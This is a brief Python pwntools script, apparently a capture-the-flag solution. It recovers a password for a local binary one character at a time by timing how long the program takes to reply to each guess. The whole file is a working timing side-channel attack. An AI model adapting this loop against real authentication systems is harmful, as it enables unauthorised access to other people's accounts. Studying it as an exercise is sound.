#!/usr/bin/env python

from pwn import *
import time
import sys

alphanum = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

context.log_level = 'error'

#pw_so_far = 's'
pw_so_far = sys.argv[1]

max = 0
tgt_char = ''

for i in alphanum:
    p = process('./guess-passwd')
    p.recv()
    p.sendline(pw_so_far+i)
    start = time.time()
    a = p.recv()
    end = time.time()
    if (end-start > max):
        max = end-start
        tgt_char = i

print(pw_so_far + tgt_char)

#p.sendline(buf)
#p.interactive()
